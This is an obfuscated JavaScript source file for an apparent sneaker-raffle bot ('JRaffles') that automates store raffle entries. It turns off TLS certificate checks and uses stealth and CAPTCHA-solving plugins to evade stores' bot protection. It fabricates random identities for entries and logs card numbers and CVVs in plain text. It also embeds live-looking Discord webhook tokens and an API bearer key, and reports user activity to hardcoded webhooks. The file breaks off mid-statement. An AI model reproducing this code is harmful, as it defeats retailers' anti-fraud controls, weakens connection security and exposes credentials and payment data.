process['env']['NODE_TLS_REJECT_UNAUTHORIZED'] = '0';
var _0x3602ef = require('node-imap'), _0x1b8d60 = require('util')['inspect'];
const _0x40c426 = require('mailparser')['simpleParser'], { EmbedBuilder: _0x595782 } = require('discord.js');
var _0x1cb199 = require('exe');
const { execFile: _0x2d8700 } = require('child_process'), _0x25d1cc = require('puppeteer-extra'), _0x49aced = require('puppeteer-extra-plugin-recaptcha'), _0x543a6c = require('puppeteer-extra-plugin-stealth'), _0x1a235e = require('chalk'), _0x16d703 = require('node-bash-title'), _0x40e0db = require('fs'), _0x497f2e = require('axios'), _0x2bdf95 = require('papaparse');
var _0x391a37 = require('random-name');
const _0x394d0f = require('request');
var _0x20a3b0 = require('prompt');
const _0x44b991 = _0x394d0f['jar']();
var _0x8702f0 = {};
const _0x3d68d7 = '1067398661929181186/wvxr1d4nwFDFE-hAKBisU_mVWLloqatitfWvCqqIv38EUYiJMm_Pr3VKsuLsUBKN3PPj', _0x23f3cf = '1067398856721051719/2gS-h641y_RoqR-KZ5aOcrnDfvvXNQIz4uQv8eA8A5_nsRSJlaCaStreLwCu5lmUjO4H', _0x1be3cc = '1068515411877957743/t_TXlLhYbeQmPL19hyGeNqi1G0KPT8KCBYOVOcryGMvXPfIUBEpNZRBCC1j7OFRej4A6', _0x4966f8 = '1068519704525807616/luGgvM1ZbR7g1zM5-10y5yceL2OGVCjrlkB6XxQL-hdoHUJ6hwSVAn6vVNyieHWLqPHE', _0x2e2924 = '1070657276525940746/GSfXwIxjuRjwmP3sTDw73M4V2P5OJqMFgZyECtpBwFmtXGINvj1xFsVsZ2KwGBpJNHpn', _0x3b52f0 = '1072865476457287711/EePVQu0bb06IdHG3FfG7M-JDaE-38prupCPoCqaduP6mG_tsshUSaKidyfyVx0YgNC7e';
var _0x4ba063 = 'https://discord.com/api/webhooks/', _0x52dfba = '' + _0x4ba063 + _0x1be3cc, _0x54e762 = '' + _0x4ba063 + _0x4966f8, _0x2ae18c = '' + _0x4ba063 + _0x3d68d7, _0x5cf6ec = '' + _0x4ba063 + _0x23f3cf, _0x355433 = '' + _0x4ba063 + _0x2e2924, _0x3a1abe = '' + _0x4ba063 + _0x3b52f0;
const _0x306a7e = JSON['parse'](_0x40e0db['readFileSync']('../package.json', 'utf-8')), _0x4a89e9 = _0x306a7e['version'];
var _0x78687a, _0x1d42f7, _0x263f26, _0xdf46ee, _0xadfc3e, _0x27ab59, _0x397af7, _0x25c138;
const _0x1c1af0 = 'pk_7R7rRwMpveiR8OufEx9xIDMdU8Y95GgvGLF59wWRqklMwhXdpDnh5sN2KfaPHjEe';
let _0x259562 = ![];
const _0x495697 = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ', _0x293079 = '0123456789';
var _0xbff44a = _0x495697['split']('');
const _0x434678 = require('auto-git-update'), { PageEmittedEvents: _0x7fde55 } = require('puppeteer'), { getRandomValues: _0x26502d } = require('crypto'), { resolve: _0x913b1d } = require('path'), { Console: _0x2c396f } = require('console'), _0x4b7687 = {
    'repository': 'https://github.com/Jarno97/JRafflesBot',
    'branch': 'main',
    'fromReleases': ![],
    'tempLocation': 'C:/temp/jraffles',
    'ignoreFiles': [
        'settings.json',
        'proxies.txt',
        'tasks/maha.csv',
        'tasks/footshop.csv',
        'tasks/afew.csv',
        'tasks/oqium.csv',
        'tasks/patta.csv',
        'accounts/patta.csv',
        'tasks/kickz.csv',
        'accounts/kickz-verified.csv',
        'accounts/kickz-unverified.csv'
    ]
}, _0x557057 = new _0x434678(_0x4b7687);
async function _0x24032f() {
    _0xadfc3e = _0x40e0db['readdirSync']('../proxies'), _0xdf46ee = _0x40e0db['readdirSync']('../tasks'), !_0x40e0db['existsSync']('../accounts/fenom.csv') && _0x40e0db['writeFileSync']('../accounts/fenom.csv', 'Email,Password\x0a'), !_0x40e0db['existsSync']('../accounts/bstn.csv') && _0x40e0db['writeFileSync']('../accounts/bstn.csv', 'Email,Password\x0a'), !_0x40e0db['existsSync']('../accounts/eql.csv') && _0x40e0db['writeFileSync']('../accounts/eql.csv', 'Email,Password,Phone\x0a'), !_0x40e0db['existsSync']('../failed-tasks.csv') && _0x40e0db['writeFileSync']('../failed-tasks.csv', 'Time,Store,Mode,Url,Size,Follower,FirstName,LastName,Address1,Address2,HouseNumber,Zip,City,State,Country,Phone,Email,Password,PaymentMethod,CardType,NameOnCard,CardNumber,ExpiryDate,CVV,IsBillingSame,BillingFirstName,BillingLastName,BillingAddress1,BillingAddress2,BillingHouseNumber,BillingZip,BillingCity,BillingState,BillingCountry,BillingPhone\x0a'), !_0x40e0db['existsSync']('../successful-tasks.csv') && _0x40e0db['writeFileSync']('../successful-tasks.csv', 'Time,Store,Mode,Url,Size,Follower,FirstName,LastName,Address1,Address2,HouseNumber,Zip,City,State,Country,Phone,Email,Password,PaymentMethod,CardType,NameOnCard,CardNumber,ExpiryDate,CVV,IsBillingSame,BillingFirstName,BillingLastName,BillingAddress1,BillingAddress2,BillingHouseNumber,BillingZip,BillingCity,BillingState,BillingCountry,BillingPhone\x0a'), _0x8702f0 = JSON['parse'](_0x40e0db['readFileSync']('../settings.json', 'utf-8')), !_0x8702f0['delay'] && (_0x8702f0['delay'] = 0x3c, _0x40e0db['writeFileSync']('../settings.json', JSON['stringify'](_0x8702f0, null, 0x2))), !_0x8702f0['masterMail'] && (_0x8702f0['masterMail'] = 'yourmail@gmail.com', _0x40e0db['writeFileSync']('../settings.json', JSON['stringify'](_0x8702f0, null, 0x2))), !_0x8702f0['masterPassword'] && (_0x8702f0['masterPassword'] = 'read\x20the\x20guide\x20on\x20how\x20to\x20get\x20an\x20APP\x20PASSWORD', _0x40e0db['writeFileSync']('../settings.json', JSON['stringify'](_0x8702f0, null, 0x2))), !_0x8702f0['captchaKey'] && (_0x8702f0['captchaKey'] = '', _0x40e0db['writeFileSync']('../settings.json', JSON['stringify'](_0x8702f0, null, 0x2))), !_0x8702f0['useRandomProxy'] && (_0x8702f0['useRandomProxy'] = !![], _0x40e0db['writeFileSync']('../settings.json', JSON['stringify'](_0x8702f0, null, 0x2))), !_0x8702f0['shuffleTasks'] && (_0x8702f0['shuffleTasks'] = ![], _0x40e0db['writeFileSync']('../settings.json', JSON['stringify'](_0x8702f0, null, 0x2))), !_0x8702f0['webhook'] && (_0x8702f0['webhook'] = '', _0x40e0db['writeFileSync']('../settings.json', JSON['stringify'](_0x8702f0, null, 0x2))), _0x8702f0['delay'] <= 0x1388 && (_0x8702f0['delay'] = _0x8702f0['delay'] * 0x3e8), _0x8702f0['AfewDelay'] && (delete _0x8702f0['AfewDelay'], _0x40e0db['writeFileSync']('../settings.json', JSON['stringify'](_0x8702f0, null, 0x2))), _0x8702f0['MahaDelay'] && (delete _0x8702f0['MahaDelay'], _0x40e0db['writeFileSync']('../settings.json', JSON['stringify'](_0x8702f0, null, 0x2))), _0x8702f0['footshopDelay'] && (delete _0x8702f0['footshopDelay'], _0x40e0db['writeFileSync']('../settings.json', JSON['stringify'](_0x8702f0, null, 0x2))), _0x8702f0['MahaDelay'] = _0x8702f0['delay'], _0x4ba063 = _0x8702f0['webhook'], _0x27ab59 = _0x8702f0['licenseKey'];
}
let _0x1ec587, _0x4c7975 = [], _0x336206;
const _0x7e80ad = _0x4de43d => new Promise(_0x2deabe => setTimeout(_0x2deabe, _0x4de43d));
function _0x545162(_0x599b4f, _0x5239c0) {
    return Math['floor'](Math['random']() * (_0x5239c0 - _0x599b4f + 0x1) + _0x599b4f);
}
function _0x14af15(_0x1958ff) {
    let _0x4534dc = _0x1958ff['length'], _0x2da2e3;
    while (_0x4534dc != 0x0) {
        _0x2da2e3 = Math['floor'](Math['random']() * _0x4534dc), _0x4534dc--, [_0x1958ff[_0x4534dc], _0x1958ff[_0x2da2e3]] = [
            _0x1958ff[_0x2da2e3],
            _0x1958ff[_0x4534dc]
        ];
    }
    return _0x1958ff;
}
async function _0x2886f8(_0x560c20) {
    return _0x497f2e['get']('https://api.hyper.co/v4/licenses/' + _0x560c20, { 'headers': { 'Authorization': 'Bearer\x20' + _0x1c1af0 } })['then'](_0x93a21d => _0x93a21d['data'])['catch'](() => null);
}
;
async function _0x11d6c3(_0x2456be) {
    console['clear']();
    if (_0x2456be == 'AWGH-0N92-JE6S-HOHU') {
        console['log']('Please\x20paste\x20your\x20key\x20here:');
        var _0x52376c = await _0x20a3b0['get']('License');
        if (_0x52376c['License'] == 'AWGH-0N92-JE6S-HOHU')
            return console['log']('Error\x20please\x20use\x20the\x20key\x20on\x20the\x20JRaffles\x20dashboard'), await _0x7e80ad(0xbb8), _0x11d6c3(_0x2456be);
        _0x2456be = _0x52376c['License'], _0x8702f0['licenseKey'] = _0x2456be, _0x27ab59 = _0x2456be, _0x40e0db['writeFileSync']('../settings.json', JSON['stringify'](_0x8702f0));
    }
    console['log']('Checking\x20license\x20' + _0x27ab59 + '...'), await _0x7e80ad(0x320);
    const _0x4a4814 = await _0x2886f8(_0x2456be);
    _0x397af7 = JSON['stringify'](_0x4a4814['user']['discord']['username'])['substring'](0x1)['slice'](0x0, -0x1), _0x25c138 = JSON['stringify'](_0x4a4814['user']['discord']['avatar'])['substring'](0x1)['slice'](0x0, -0x1);
    if (!_0x4a4814)
        return console['log']('License\x20not\x20found');
    if (!_0x4a4814['user'])
        return console['log']('License\x20not\x20bound');
    return _0x4a4814['status'] === 'active' ? (console['log']('License\x20is\x20good\x20to\x20go!'), _0x259562 = !![]) : (console['log']('Could\x20not\x20find\x20license..'), _0x259562 = ![]);
}
async function _0x85a4e8() {
    var _0x19c688 = await _0x20a3b0['get']('Module');
    return console['clear'](), _0x19c688['Module'];
}
;
async function _0x15b829() {
    var _0x177273 = await _0x20a3b0['get']('Setting');
    return console['clear'](), _0x177273['Setting'];
}
async function _0x4b59aa() {
    console['clear'](), console['log']('Choose\x20A\x20File\x20to\x20Run\x20\x0a');
    for (var _0x12eeb2 = 0x0; _0x12eeb2 < _0xdf46ee['length']; _0x12eeb2++) {
        console['log']('\x20(' + _0x12eeb2 + ')\x20' + _0xdf46ee[_0x12eeb2]);
    }
    console['log']('');
    var _0x4027fd = await _0x20a3b0['get']('Task');
    if (_0x4027fd['Task'] > _0xdf46ee['length'] - 0x1 || isNaN(_0x4027fd['Task']) == !![])
        return console['log']('Invalid\x20selection'), await _0x7e80ad(0x3e8), _0x4b59aa();
    var _0x48a26c = _0x40e0db['readFileSync']('../tasks/' + _0xdf46ee[_0x4027fd['Task']], 'utf-8');
    return _0x263f26 = _0x2bdf95['parse'](_0x48a26c, { 'header': !![] })['data'], console['clear'](), console['log']('Running\x20' + _0x1a235e['blue'](_0xdf46ee[_0x4027fd['Task']])), _0x78687a = _0xdf46ee[_0x4027fd['Task']], _0x263f26;
}
async function _0x8560e2() {
    console['clear'](), console['log']('Choose\x20Proxies\x20to\x20Use\x20\x0a');
    for (var _0x4859e7 = 0x0; _0x4859e7 < _0xadfc3e['length']; _0x4859e7++) {
        console['log']('\x20(' + _0x4859e7 + ')\x20' + _0xadfc3e[_0x4859e7]);
    }
    console['log']('');
    var _0x2bdbac = await _0x20a3b0['get']('Proxies');
    if (_0x2bdbac['Proxies'] > _0xadfc3e['length'] - 0x1 || isNaN(_0x2bdbac['Proxies']) == !![])
        return console['log']('Invalid\x20selection'), await _0x7e80ad(0x3e8), _0x8560e2();
    var _0x294fec = _0x40e0db['readFileSync']('../proxies/' + _0xadfc3e[_0x2bdbac['Proxies']], 'utf-8')['split']('\x0a');
    let _0x3aee29 = _0x294fec['map']((_0x5ba056, _0x3aa82d) => {
        sanatizeProxy = _0x5ba056['replace']('\x0d', '');
        if (_0x294fec[_0x3aa82d + 0x1] != undefined)
            return '' + sanatizeProxy;
        return '' + sanatizeProxy;
    });
    return _0x1d42f7 = _0xadfc3e[_0x2bdbac['Proxies']], console['clear'](), _0x3aee29;
}
async function _0x6989c2() {
    var _0x3b2948 = await _0x20a3b0['get']('Value');
    return console['clear'](), _0x3b2948['Value'];
}
async function _0x2206d4(_0x4cb455) {
    console['clear'](), console['log']('What\x20would\x20you\x20like\x20to\x20do?\x20\x0a');
    for (var _0xd86783 = 0x0; _0xd86783 < _0x4cb455['length']; _0xd86783++) {
        console['log']('\x20(' + _0xd86783 + ')\x20[' + _0x4cb455[_0xd86783]['name'] + ']');
    }
    ;
    console['log']('');
    var _0x2bdf3e = await _0x20a3b0['get']('Module');
    return _0x2bdf3e['Module'];
}
async function _0x29ac51() {
    var _0x2e8961 = await _0x20a3b0['get']('Password');
    return console['clear'](), _0x2e8961['Password'];
}
;
async function _0x258be0() {
    var _0x9f45eb = await _0x20a3b0['get']('Links');
    return _0x9f45eb['Links'];
}
;
async function _0x14cf08() {
    console['log']('Choose\x20a\x20Raffle\x20to\x20enter:\x20\x0a');
    for (var _0x32074c = 0x0; _0x32074c < _0x4c7975['length']; _0x32074c++) {
        console['log']('\x20(' + _0x32074c + ')\x20' + _0x4c7975[_0x32074c]);
    }
    ;
    console['log']();
    let _0x175517 = await _0x20a3b0['get']('Product');
    return console['clear'](), _0x175517['Product'];
}
;
function _0x441ea7() {
    var _0x515699 = new Date(Date['now']())['toLocaleTimeString']();
    return _0x515699;
}
;
function _0x2cc4fc() {
    var _0xce1040 = new Date(Date['now']())['toLocaleString']();
    return _0xce1040['replace'](',', '');
}
async function _0x10a0d6(_0x2661f4, _0x4fe23d) {
    let _0x27f500 = { 'headers': { 'content-type': 'application/json' } };
    if (_0x4a89e9 != 'devkey') {
        await _0x497f2e['post'](_0x2661f4, _0x4fe23d, _0x27f500);
        return;
    }
    return console['log']('devkey\x20settings\x20enabled,\x20not\x20sending\x20webhooks');
}
;
async function _0x296449(_0x187c38, _0x172bae, _0x4949fa, _0x911dec, _0x5197d1) {
    if (!_0x911dec && _0x4949fa == 'dev') {
        var _0x3eb070 = new _0x595782()['setColor'](0xc0d6d6)['setTitle']('Successful\x20Raffle\x20Entry')['setAuthor']({
            'name': 'JRaffles',
            'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
            'url': 'https://twitter.com/JRaffles_'
        })['setThumbnail'](_0x172bae['logo'])['addFields']({
            'name': 'Store',
            'value': '' + _0x172bae['store'],
            'inline': !![]
        })['addFields']({
            'name': 'Size',
            'value': '' + _0x187c38['Size'],
            'inline': !![]
        })['addFields']({
            'name': 'Delay',
            'value': '' + _0x8702f0['delay'],
            'inline': !![]
        })['addFields']({
            'name': 'User',
            'value': '' + _0x397af7,
            'inline': !![]
        })['addFields']({
            'name': 'URL',
            'value': '' + _0x187c38['Url'],
            'inline': !![]
        })['addFields']({
            'name': 'Mail',
            'value': '' + _0x187c38['Email'],
            'inline': !![]
        })['setTimestamp']()['setFooter']({
            'text': 'JRaffles\x20v' + _0x4a89e9,
            'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
        });
        return _0x3eb070['data'];
    } else {
        if (_0x911dec && _0x4949fa == 'dev') {
            var _0x3eb070 = new _0x595782()['setColor'](0xc0d6d6)['setTitle']('Failed\x20Raffle\x20Entry')['setAuthor']({
                'name': 'JRaffles',
                'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                'url': 'https://twitter.com/JRaffles_'
            })['setThumbnail'](_0x172bae['logo'])['addFields']({
                'name': 'User',
                'value': '' + _0x397af7,
                'inline': !![]
            }, {
                'name': 'Store',
                'value': '' + _0x172bae['store'],
                'inline': !![]
            }, {
                'name': 'Size',
                'value': '' + _0x187c38['Size'],
                'inline': !![]
            }, {
                'name': 'Delay',
                'value': '' + _0x8702f0['delay'],
                'inline': !![]
            })['addFields']({
                'name': 'ERROR',
                'value': '' + _0x5197d1,
                'inline': !![]
            })['addFields']({
                'name': 'URL',
                'value': '' + _0x187c38['Url']
            })['addFields']({
                'name': 'Mail',
                'value': '' + _0x187c38['Email'],
                'inline': !![]
            })['setTimestamp']()['setFooter']({
                'text': 'JRaffles\x20v' + _0x4a89e9,
                'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
            });
            return _0x3eb070['data'];
        } else {
            if (_0x4949fa == 'pub') {
                var _0x3eb070 = new _0x595782()['setColor'](0xc0d6d6)['setTitle']('Succesful\x20Raffle\x20Entry')['setAuthor']({
                    'name': 'JRaffles',
                    'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                    'url': 'https://twitter.com/JRaffles_'
                })['setThumbnail'](_0x172bae['logo'])['addFields']({
                    'name': 'Store',
                    'value': '' + _0x172bae['store'],
                    'inline': !![]
                }, {
                    'name': 'Size',
                    'value': '' + _0x187c38['Size'],
                    'inline': !![]
                }, {
                    'name': 'Delay',
                    'value': '' + _0x8702f0['delay'],
                    'inline': !![]
                })['addFields']({
                    'name': 'URL',
                    'value': '||' + _0x187c38['Url'] + '||'
                })['setTimestamp']()['setFooter']({
                    'text': 'JRaffles\x20v' + _0x4a89e9,
                    'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
                });
                return _0x3eb070['data'];
            } else {
                if (_0x4949fa == 'acc' && !_0x911dec) {
                    var _0x3eb070 = new _0x595782()['setColor'](0xc0d6d6)['setTitle']('Account\x20Generated')['setAuthor']({
                        'name': 'JRaffles',
                        'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                        'url': 'https://twitter.com/JRaffles_'
                    })['setThumbnail'](_0x172bae['logo'])['addFields']({
                        'name': 'User',
                        'value': '' + _0x397af7,
                        'inline': !![]
                    }, {
                        'name': 'Store',
                        'value': '' + _0x172bae['store'],
                        'inline': !![]
                    }, {
                        'name': 'Delay',
                        'value': '' + _0x8702f0['delay'],
                        'inline': !![]
                    })['setTimestamp']()['setFooter']({
                        'text': 'JRaffles\x20v' + _0x4a89e9,
                        'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
                    });
                    return _0x3eb070['data'];
                } else {
                    if (_0x4949fa == 'acc' && _0x911dec) {
                        var _0x3eb070 = new _0x595782()['setColor'](0xc0d6d6)['setTitle']('Account\x20Generation\x20Failed')['setAuthor']({
                            'name': 'JRaffles',
                            'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                            'url': 'https://twitter.com/JRaffles_'
                        })['setThumbnail'](_0x172bae['logo'])['addFields']({
                            'name': 'User',
                            'value': '' + _0x397af7,
                            'inline': !![]
                        }, {
                            'name': 'Error',
                            'value': '' + _0x5197d1,
                            'inline': !![]
                        }, {
                            'name': 'Store',
                            'value': '' + _0x172bae['store'],
                            'inline': !![]
                        }, {
                            'name': 'Delay',
                            'value': '' + _0x8702f0['delay'],
                            'inline': !![]
                        })['setTimestamp']()['setFooter']({
                            'text': 'JRaffles\x20v' + _0x4a89e9,
                            'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
                        });
                        return _0x3eb070['data'];
                    } else {
                        if (_0x4949fa == 'open') {
                            var _0x3eb070 = new _0x595782()['setColor'](0xc0d6d6)['setTitle']('User\x20Opened\x20JRaffles')['setAuthor']({
                                'name': 'JRaffles',
                                'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                                'url': 'https://twitter.com/JRaffles_'
                            })['setThumbnail'](_0x25c138)['addFields']({
                                'name': 'User',
                                'value': '' + _0x397af7,
                                'inline': !![]
                            })['setTimestamp']()['setFooter']({
                                'text': 'JRaffles\x20v' + _0x4a89e9,
                                'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
                            });
                            return _0x3eb070['data'];
                        } else {
                            if (!_0x911dec && _0x4949fa == 'ver') {
                                var _0x3eb070 = new _0x595782()['setColor'](0xc0d6d6)['setTitle']('Successful\x20Verification')['setAuthor']({
                                    'name': 'JRaffles',
                                    'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                                    'url': 'https://twitter.com/JRaffles_'
                                })['setThumbnail'](_0x172bae['logo'])['addFields']({
                                    'name': 'User',
                                    'value': '' + _0x397af7,
                                    'inline': !![]
                                }, {
                                    'name': 'Store',
                                    'value': '' + _0x172bae['store'],
                                    'inline': !![]
                                }, {
                                    'name': 'Delay',
                                    'value': '' + _0x8702f0['delay'],
                                    'inline': !![]
                                })['setTimestamp']()['setFooter']({
                                    'text': 'JRaffles\x20v' + _0x4a89e9,
                                    'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
                                });
                                return _0x3eb070['data'];
                            } else {
                                if (_0x911dec && _0x4949fa == 'ver') {
                                    var _0x3eb070 = new _0x595782()['setColor'](0xc0d6d6)['setTitle']('Verification\x20Failed')['setAuthor']({
                                        'name': 'JRaffles',
                                        'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                                        'url': 'https://twitter.com/JRaffles_'
                                    })['setThumbnail'](_0x172bae['logo'])['addFields']({
                                        'name': 'User',
                                        'value': '' + _0x397af7,
                                        'inline': !![]
                                    }, {
                                        'name': 'Error',
                                        'value': '' + _0x5197d1,
                                        'inline': !![]
                                    }, {
                                        'name': 'Store',
                                        'value': '' + _0x172bae['store'],
                                        'inline': !![]
                                    }, {
                                        'name': 'Delay',
                                        'value': '' + _0x8702f0['delay'],
                                        'inline': !![]
                                    })['setTimestamp']()['setFooter']({
                                        'text': 'JRaffles\x20v' + _0x4a89e9,
                                        'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
                                    });
                                    return _0x3eb070['data'];
                                }
                            }
                        }
                    }
                }
            }
        }
    }
}
async function _0x6f470f(_0x2e608b, _0x24ef86) {
    var _0x345805 = _0x2e608b[_0x24ef86]['Address1']['split'](''), _0x308472 = _0x2e608b[_0x24ef86]['Address2']['split'](''), _0x242756 = _0x2e608b[_0x24ef86]['Email']['split']('@');
    for (var _0x1f7c65 = 0x0; _0x1f7c65 < _0x345805['length']; _0x1f7c65++) {
        if (_0x345805[_0x1f7c65] == 'X') {
            var _0x5042d1 = Math['round'](Math['random']() * (_0x495697['length'] - 0x1));
            _0x345805[_0x1f7c65] = _0xbff44a[_0x5042d1];
        }
    }
    ;
    for (var _0x1f7c65 = 0x0; _0x1f7c65 < _0x308472['length']; _0x1f7c65++) {
        if (_0x308472[_0x1f7c65] == 'X') {
            var _0x5042d1 = Math['round'](Math['random']() * (_0x495697['length'] - 0x1));
            _0x308472[_0x1f7c65] = _0xbff44a[_0x5042d1];
        }
    }
    ;
    _0x2e608b[_0x24ef86]['FirstName'] == 'RANDOM' && (_0x2e608b[_0x24ef86]['FirstName'] = _0x391a37['first']());
    _0x2e608b[_0x24ef86]['LastName'] == 'RANDOM' && (_0x2e608b[_0x24ef86]['LastName'] = _0x391a37['last']());
    _0x242756[0x0] == 'RANDOM' ? _0x242756[0x0] = '' + _0x391a37['first']() + _0x391a37['last']() + _0x545162(0x1, 0x270f) + '@' : _0x242756[0x0] = _0x242756[0x0] + '@';
    _0x2e608b[_0x24ef86]['Email'] = _0x242756['join'](''), _0x2e608b[_0x24ef86]['Address1'] = _0x345805['join'](''), _0x2e608b[_0x24ef86]['Address2'] = _0x308472['join']('');
    _0x2e608b[_0x24ef86]['Phone'] == 'RANDOM' && (_0x2e608b[_0x24ef86]['Phone'] = '0' + _0x545162(0x5f5e100, 0x3b9ac9ff));
    if (_0x2e608b[_0x24ef86]['Follower'] == 'RANDOM') {
        var _0x44864f = _0x545162(0x1, 0x270f);
        _0x2e608b[_0x24ef86]['Follower'] = '' + _0x391a37['first']() + _0x391a37['last']() + _0x44864f + '\x20';
    }
    _0x2e608b[_0x24ef86]['HouseNumber'] == 'RANDOM' && (_0x2e608b[_0x24ef86]['HouseNumber'] = _0x545162(0x1, 0xc8));
    if (_0x2e608b[_0x24ef86]['Address1'] == 'RANDOM') {
        var _0x40af17 = Math['round'](Math['random']() * (_0x495697['length'] - 0x1)), _0x9fc208 = _0xbff44a[_0x40af17];
        _0x2e608b[_0x24ef86]['Address1'] = _0x391a37['last']() + 'straat', _0x2e608b[_0x24ef86]['Zip'] == '' && (_0x2e608b[_0x24ef86]['Postcode'] = _0x545162(0x3e8, 0x270f) + '\x20' + _0x9fc208 + _0x9fc208, _0x2e608b[_0x24ef86]['Zip'] = _0x2e608b[_0x24ef86]['Postcode']), _0x2e608b[_0x24ef86]['HouseNumber'] = '' + _0x545162(0x1, 0xc8);
    }
    return;
}
;
async function _0xc1caad(_0x24f26c, _0x1a28aa) {
    _0x40e0db['appendFileSync']('../failed-tasks.csv', _0x2cc4fc() + ',' + _0x1a28aa['store'] + ',' + _0x1a28aa['name'] + ',' + _0x24f26c['Url'] + ',' + _0x24f26c['Size'] + ',' + _0x24f26c['Follower'] + ',' + _0x24f26c['FirstName'] + ',' + _0x24f26c['LastName'] + ',' + _0x24f26c['Address1'] + ',' + _0x24f26c['Address2'] + ',' + _0x24f26c['HouseNumber'] + ',' + _0x24f26c['Zip'] + ',' + _0x24f26c['City'] + ',' + _0x24f26c['State'] + ',' + _0x24f26c['Country'] + ',' + _0x24f26c['Phone'] + ',' + _0x24f26c['Email'] + ',' + _0x24f26c['Password'] + ',' + _0x24f26c['PaymentMethod'] + ',' + _0x24f26c['CardType'] + ',' + _0x24f26c['NameOnCard'] + ',' + _0x24f26c['CardNumber'] + ',' + _0x24f26c['ExpiryDate'] + ',' + _0x24f26c['CVV'] + ',' + _0x24f26c['IsBillingSame'] + ',,,,,,,,,,\x0a');
}
async function _0x4bdc1f(_0x14419b, _0x31b70c) {
    _0x40e0db['appendFileSync']('../successful-tasks.csv', _0x2cc4fc() + ',' + _0x31b70c['store'] + ',' + _0x31b70c['name'] + ',' + _0x14419b['Url'] + ',' + _0x14419b['Size'] + ',' + _0x14419b['Follower'] + ',' + _0x14419b['FirstName'] + ',' + _0x14419b['LastName'] + ',' + _0x14419b['Address1'] + ',' + _0x14419b['Address2'] + ',' + _0x14419b['HouseNumber'] + ',' + _0x14419b['Zip'] + ',' + _0x14419b['City'] + ',' + _0x14419b['State'] + ',' + _0x14419b['Country'] + ',' + _0x14419b['Phone'] + ',' + _0x14419b['Email'] + ',' + _0x14419b['Password'] + ',' + _0x14419b['PaymentMethod'] + ',' + _0x14419b['CardType'] + ',' + _0x14419b['NameOnCard'] + ',' + _0x14419b['CardNumber'] + ',' + _0x14419b['ExpiryDate'] + ',' + _0x14419b['CVV'] + ',' + _0x14419b['IsBillingSame'] + ',,,,,,,,,,\x0a');
}
function _0x30cb60() {
    let _0xa0aba5 = proxyFile['split']('\x0a'), _0x378404 = _0xa0aba5['map']((_0x4b920f, _0x93a7cd) => {
        sanatizeProxy = _0x4b920f['replace']('\x0d', '');
        if (_0xa0aba5[_0x93a7cd + 0x1] != undefined)
            return '' + sanatizeProxy;
        return '' + sanatizeProxy;
    });
    return _0x378404;
}
;
async function _0x583d7c(_0x1eb420) {
    var _0x2d48f2 = _0x1eb420[0x1]['split'](':');
    const _0x3d0df6 = await _0x25d1cc['launch']({
        'headless': !![],
        'args': ['--proxy-server=' + _0x2d48f2[0x0] + ':' + _0x2d48f2[0x1] + ',--no-sandbox\x27,\x0a\x20\x20\x20\x20\x20\x20\x27--disable-setuid-sandbox,--force-device-scale-factor=0.3']
    });
    try {
        const _0x4807c0 = await _0x3d0df6['newPage']();
        await _0x4807c0['authenticate']({
            'username': '' + _0x2d48f2[0x2],
            'password': '' + _0x2d48f2[0x3]
        }), console['log'](_0x441ea7() + '\x20[' + _0x48b703[taskModule]['name'] + ']\x20Afew\x20Scraper\x20started'), await _0x4807c0['setUserAgent']('Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36'), await _0x4807c0['setRequestInterception'](!![]), _0x4807c0['on']('request', _0x533014 => {
            _0x533014['resourceType']() === 'image' || _0x533014['resourceType']() === 'font' || _0x533014['resourceType']() === 'media' ? _0x533014['abort']() : _0x533014['continue']();
        }), await _0x4807c0['goto']('https://en.afew-store.com/collections/sneaker-raffles'), console['log'](_0x441ea7() + '\x20[' + _0x48b703[taskModule]['name'] + ']\x20Looking\x20for\x20Raffles'), await _0x4807c0['waitForTimeout'](0xbb8), await _0x4807c0['waitForSelector']('.product-card');
        const _0x455a1e = await _0x4807c0['$$eval']('a.product-card', _0x53f587 => {
            return _0x53f587['map'](_0x50a3cf => _0x50a3cf['href']);
        });
        return _0x4c7975 = _0x455a1e;
    } catch (_0x18d251) {
        console['log']('\x20' + _0x18d251);
    } finally {
        _0x3d0df6['close'](), console['clear']();
    }
}
;
async function _0x32d40e(_0x3a07f1, _0x1d3763) {
    _0x25d1cc['use'](_0x543a6c()), _0x25d1cc['use'](_0x49aced({
        'provider': {
            'id': '2captcha',
            'token': '' + _0x8702f0['captchaKey']
        },
        'visualFeedback': !![]
    }));
    for (var _0x27a987 = 0x0; _0x27a987 < bouncewear['length']; _0x27a987++) {
        await _0x6f470f(bouncewear, _0x27a987);
        if (bouncewear[_0x27a987]['Email'] == '' || bouncewear[_0x27a987]['Password'] == '' || bouncewear[_0x27a987]['FirstName'] == '' || bouncewear[_0x27a987]['LastName'] == '') {
            console['log'](_0x441ea7() + '\x20[' + _0x48b703[taskModule]['name'] + ']\x20Task\x20' + (_0x27a987 + 0x1) + '\x20:\x20Invalid\x20CSV');
            continue;
        }
        if (_0x8702f0['useRandomProxy'] = ![])
